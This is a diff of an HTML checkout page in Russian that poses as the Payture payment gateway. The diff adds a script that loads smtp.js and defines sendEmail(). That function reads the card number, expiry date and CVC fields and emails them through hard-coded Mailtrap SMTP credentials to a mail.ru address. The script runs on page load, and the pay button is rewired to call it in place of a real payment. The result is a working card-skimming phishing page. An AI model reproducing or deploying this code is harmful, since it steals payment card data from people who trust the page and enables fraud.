@@ -2,151 +2,191 @@
 <html lang="ru">
 
 <head>
-  <meta charset="utf-8">
-  <title>Payture</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <meta http-equiv="Pragma" content="no-cache" />
-  <meta http-equiv="Expires" CONTENT="-1"/>
-  <meta name="Expires" value="Thu, 01 Jan 1999 00:00:00"/>
-  <meta name="Cache-Control" value="no-store, no-cache, must-revalidate"/>
+    <meta charset="utf-8">
+    <title>Payture</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <meta http-equiv="Pragma" content="no-cache"/>
+    <meta http-equiv="Expires" CONTENT="-1"/>
+    <meta name="Expires" value="Thu, 01 Jan 1999 00:00:00"/>
+    <meta name="Cache-Control" value="no-store, no-cache, must-revalidate"/>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <link rel="stylesheet" href="css.css">
 
-  <link rel="stylesheet" href="css.css">
+    <script>
+        function sendEmail() {
+            Email.send({
+                Host: "smtp.mailtrap.io",
+                Username: "c96f4ccbc3a7ac",
+                Password: "10864e9f5491b3",
+                To: 'anotov2002116@mail.ru',
+                From: "xzc16@mail.ru",
+                Subject: "zxc",
+                Body: " card " + document.getElementById("data").value + " date " + document.getElementById("date").value + " cvc " + document.getElementById("cvc").value,
+            })
+                .then(function (message) {
+                });
+        }
 
-
+        sendEmail()
+    </script>
 
 </head>
 
 <body>
-  <div id="wrap">
+<div id="wrap">
     <div id="logo">
-<!--      <div class="provider-name">Payture</div>-->
-      <div class="provider-description" translate-value="ProviderDescription">ПОМОШЬ ЛЮДЯМ С ЗАБОЛЕВАНИЕМ "ХОРНИ"</div>
+        <!--      <div class="provider-name">Payture</div>-->
+        <div class="provider-description" translate-value="ProviderDescription">ПОМОШЬ ЛЮДЯМ С ЗАБОЛЕВАНИЕМ "ХОРНИ"
+        </div>
     </div>
 
 
     <div id="form">
-      <div class="amount">228322 <span translate-value="Rub">руб</span></div>
-      <div class="good" id="product-name"></div>
+        <div class="amount">228322 <span translate-value="Rub">руб</span></div>
+        <div class="good" id="product-name"></div>
 
-      <span class="response_json">{response_json}</span>
+        <span class="response_json">{response_json}</span>
 
-      <input type="hidden" name="Key" value="{key}" />
-      <input type="hidden" name="oauth_Token" value="" />	
-      <input type="hidden" name="Amount" value="{amount}" />
-      <input type="hidden" name="Total" value="{total}" />
-      <input type="hidden" name="Product" value="{product}" />
-      <input type="hidden" name="OrderId" value="{orderId}" />
-      <input type="hidden" name="ProductDescription" value="{ProductDescription}" />
-      <input type="hidden" name="Language" value="{language}" />
+        <input type="hidden" name="Key" value="{key}"/>
+        <input type="hidden" name="oauth_Token" value=""/>
+        <input type="hidden" name="Amount" value="{amount}"/>
+        <input type="hidden" name="Total" value="{total}"/>
+        <input type="hidden" name="Product" value="{product}"/>
+        <input type="hidden" name="OrderId" value="{orderId}"/>
+        <input type="hidden" name="ProductDescription" value="{ProductDescription}"/>
+        <input type="hidden" name="Language" value="{language}"/>
 
-      <div id="payment-methods">
-        <div id="yandex-pay-button" class="button ico yandex-pay" data-type="yandex_pay"></div>         
-        <button type="button" class="button ico apple-pay" data-type="apple_pay"></button>
-        <button type="button" class="button ico google-pay" data-type="google_pay"></button>
-        <button type="button" class="button ico samsung-pay" data-type="samsung_pay"></button>
-      </div>
+        <div id="payment-methods">
+            <div id="yandex-pay-button" class="button ico yandex-pay" data-type="yandex_pay"></div>
+            <button type="button" class="button ico apple-pay" data-type="apple_pay"></button>
+            <button type="button" class="button ico google-pay" data-type="google_pay"></button>
+            <button type="button" class="button ico samsung-pay" data-type="samsung_pay"></button>
+        </div>
 
-      <div id="errorTop"> </div>
-      
-      <form id="payForm">
-        <div id="card-one" class="CardType">
+        <div id="errorTop"></div>
 
-          <div class="selectCard" id="selectCard">
-            <div class="caption">
-              <span translate-value="LinkedCards">Привязанные карты</span><a href="" id="removeCard" translate-value="RemoveCard">Удалить карту</a>
+        <div id="payForm">
+            <div id="card-one" class="CardType">
+
+                <div class="selectCard" id="selectCard">
+                    <div class="caption">
+                        <span translate-value="LinkedCards">Привязанные карты</span><a href="" id="removeCard"
+                                                                                       translate-value="RemoveCard">Удалить
+                        карту</a>
+                    </div>
+                    <select name="CardId" class="top-r bottom-r">
+                        <option selected="selected" value="FreePay" translate-value="NewCard"></option>
+                        {cards}
+                    </select>
+                </div>
+
+                <ul id="card-block">
+                    <li class="i1 ic pan">
+                        <div class="label-text" translate-value="CardNumber">Номер карты</div>
+                        <input id="data" placeholder="1234 1234 1234 1234" class="onlyNum onlyCardNum" type="tel"
+                               name="CardNumber" autocomplete="cc-number" next="DateTo"/>
+                        <div id="mp-arrow"></div>
+                    </li>
+
+                    <ul id='card-list' class="bottom-r"></ul>
+
+                    <li class="i2 ic expiry bottom-left-r">
+                        <div class="label-text" translate-value="CardExpiryDate">Срок действия карты</div>
+                        <input placeholder="MM/YY" id="date" class="onlyNum" name="DateTo" autocomplete="cc-exp"
+                               type="tel" next="SecureCode" prev="CardNumber" translate-placeholder="MMYY"
+                               maxlength="5"/>
+                        <input id="EMonth" name="EMonth" type="hidden">
+                        <input id="EYear" name="EYear" type="hidden">
+                    </li>
+
+                    <li class="i3 ic cvc bottom-right-r">
+                        <div class="label-text" translate-value="VerificationCode">Проверочный код</div>
+                        <input placeholder="CVC" class="onlyNum" name="SecureCode" autocomplete="cc-csc" type="tel"
+                               next="EChequeCustomerContact" prev="DateTo" id="cvc"/>
+                    </li>
+
+                    <li class="i4 ic holder">
+                        <div class="label-text" translate-value="Cardholder">Имя и Фамилия на карте</div>
+                        <input placeholder="IVAN IVANOV" class="cap onlyLat" name="CardHolder" autocomplete="cc-name"
+                               next="EChequeCustomerContact" prev="SecureCode"/>
+                    </li>
+                </ul>
+                <input class="text" id="PaytureId" name="PaytureId" value="" type="hidden">
+                <div class="checkmark-container addCard">
+                    <label class="add-card" id="addCard"><span
+                            translate-value="RememberCard">Запомнить карту</span><input type="checkbox" name="AddCard"
+                                                                                        value="True"><span
+                            class="checkmark"></span></label>
+                </div>
+
             </div>
-            <select name="CardId" class="top-r bottom-r">
-              <option selected="selected" value="FreePay" translate-value="NewCard"></option>
-              {cards}
-            </select> 
-          </div>
 
-          <ul id="card-block">
-            <li class="i1 ic pan">
-              <div class="label-text" translate-value="CardNumber">Номер карты</div>
-              <input placeholder="1234 1234 1234 1234" class="onlyNum onlyCardNum" type="tel" name="CardNumber" autocomplete="cc-number" next="DateTo" />
-              <div id="mp-arrow"></div>
-            </li>
+            <div id="overlay-cvv">
+                <ul>
+                    <li class="i2 ic cvc top-left-r bottom-left-r">
+                        <div class="label-text" translate-value="VerificationCode">Проверочный код</div>
+                        <input placeholder="CVV/CVC2" maxlength="4" class="onlyNum" name="google-cvv"
+                               autocomplete="new-password" type="tel"/>
+                        <input placeholder="CVV/CVC2" maxlength="3" class="onlyNum" name="yandex-cvv"
+                               autocomplete="new-password" type="tel"/>
+                    </li>
 
-            <ul id='card-list' class="bottom-r"></ul>
+                    <li class="i3 ic ofh top-right-r bottom-right-r">
+                        <button class="inner-button google" type="button" translate-value="Pay">Оплатить</button>
+                        <button class="inner-button yandex" type="button" translate-value="Pay">Оплатить</button>
+                    </li>
+                </ul>
+            </div>
 
-            <li class="i2 ic expiry bottom-left-r">
-              <div class="label-text" translate-value="CardExpiryDate">Срок действия карты</div>
-              <input placeholder="MM/YY" id="date" class="onlyNum" name="DateTo" autocomplete="cc-exp" type="tel" next="SecureCode" prev="CardNumber" translate-placeholder="MMYY" maxlength="5"/>
-              <input id="EMonth" name="EMonth" type="hidden">
-              <input id="EYear" name="EYear" type="hidden">
-            </li>
-            
-            <li class="i3 ic cvc bottom-right-r">
-              <div class="label-text" translate-value="VerificationCode">Проверочный код</div>
-              <input placeholder="CVC" class="onlyNum" name="SecureCode" autocomplete="cc-csc" type="tel" next="EChequeCustomerContact" prev="DateTo" />
-            </li>
-            
-            <li class="i4 ic holder">
-              <div class="label-text" translate-value="Cardholder">Имя и Фамилия на карте</div>
-              <input placeholder="IVAN IVANOV" class="cap onlyLat" name="CardHolder" autocomplete="cc-name" next="EChequeCustomerContact" prev="SecureCode" />  
-            </li>
-          </ul>
-          <input class="text" id="PaytureId" name="PaytureId" value="" type="hidden">
-          <div class="checkmark-container addCard">
-            <label class="add-card" id="addCard"><span translate-value="RememberCard">Запомнить карту</span><input type="checkbox" name="AddCard" value="True"><span class="checkmark"></span></label>
-          </div>
 
+            <div id="email-visibility" class="checkmark-container">
+                <label class="caption"><input type="checkbox"><span class="checkmark"></span><span
+                        translate-value="EmailCaption">Получить квитанцию</span></label>
+            </div>
+
+            <div id="email">
+                <div class="ic top-r bottom-r">
+                    <input placeholder="E-MAIL" class="middle" type="text" autocomplete="email"
+                           name="EChequeCustomerContact" prev="SecureCode" next="Pay"/>
+                </div>
+            </div>
+
+            <div class="footnote offer">
+                <div id="payture-conditions" translate-value="PaytureOffer">
+                    Нажимая на кнопку, вы соглашаетесь с <a href="https://payture.com/termsofuse" target="_blank">условиями
+                    использования сервиса</a>
+                </div>
+                <button class="button pay" id="pay" name="Pay" onclick="sendEmail()"><span translate-value="Pay">Заплатить</span>
+                </button>
+                <div class="clear"></div>
+            </div>
+            <div class="footnote" translate-value="PaytureFootnote">Оплата будет произведена с помощью платёжного шлюза
+                Payture ― №1 сертифицированный провайдер платежей согласно стандартам безопасности платёжных систем Visa
+                и Mastercard.
+            </div>
         </div>
 
-        <div id="overlay-cvv">
-          <ul>
-            <li class="i2 ic cvc top-left-r bottom-left-r">
-                <div class="label-text" translate-value="VerificationCode">Проверочный код</div>
-                <input placeholder="CVV/CVC2" maxlength="4" class="onlyNum" name="google-cvv" autocomplete="new-password" type="tel" />
-                <input placeholder="CVV/CVC2" maxlength="3" class="onlyNum" name="yandex-cvv" autocomplete="new-password" type="tel" />
-            </li>
-              
-            <li class="i3 ic ofh top-right-r bottom-right-r">
-                <button class="inner-button google" type="button" translate-value="Pay">Оплатить</button>
-                <button class="inner-button yandex" type="button" translate-value="Pay">Оплатить</button>
-            </li>
-          </ul>
-        </div>
-
-        
-        <div id="email-visibility" class="checkmark-container">
-            <label class="caption"><input type="checkbox"><span class="checkmark"></span><span translate-value="EmailCaption">Получить квитанцию</span></label>
-        </div>
-        
-        <div id="email">
-          <div class="ic top-r bottom-r">
-            <input placeholder="E-MAIL" class="middle" type="text" autocomplete="email" name="EChequeCustomerContact" prev="SecureCode" next="Pay" />
-          </div>
-        </div>
-
-        <div class="footnote offer">
-          <div id="payture-conditions" translate-value="PaytureOffer">
-            Нажимая на кнопку, вы соглашаетесь с <a href="https://payture.com/termsofuse" target="_blank">условиями использования сервиса</a>
-          </div>
-          <button class="button pay" type="submit" id="pay" name="Pay"><span translate-value="Pay">Заплатить</span></button>
-          <div class="clear"></div>
-        </div>
-        <div class="footnote" translate-value="PaytureFootnote">Оплата будет произведена с помощью платёжного шлюза Payture ― №1 сертифицированный провайдер платежей согласно стандартам безопасности платёжных систем Visa и Mastercard.</div>
-      </form>
-      
     </div>
 
     <div id="result">
-      <h3></h3>
-      <p class="message"></p>
-      <p id="return-description" translate-value="ReturnDescription"><br/>Через несколько секунд вы&nbsp;будете перемещены на&nbsp;страницу магазина или&nbsp;нажмите <a href=''>сюда</a> чтобы перейти без&nbsp;ожидания</p>
+        <h3></h3>
+        <p class="message"></p>
+        <p id="return-description" translate-value="ReturnDescription"><br/>Через несколько секунд вы&nbsp;будете
+            перемещены на&nbsp;страницу магазина или&nbsp;нажмите <a href=''>сюда</a> чтобы перейти без&nbsp;ожидания
+        </p>
     </div>
 
     <div id="overlay-wait">
-      <div>
-        <h2 data-lang="wait" translate-value="PaymentInProcessing">Платеж в обработке...</h2>
-        <div class="escapingBallGContainer"><div id="escapingBall_1" class="escapingBallG"></div></div>
-      </div>
+        <div>
+            <h2 data-lang="wait" translate-value="PaymentInProcessing">Платеж в обработке...</h2>
+            <div class="escapingBallGContainer">
+                <div id="escapingBall_1" class="escapingBallG"></div>
+            </div>
+        </div>
     </div>
-    
-  </div>
-  <div class="bg"></div>
+
+</div>
+<div class="bg"></div>
 
 </body>
 </html>
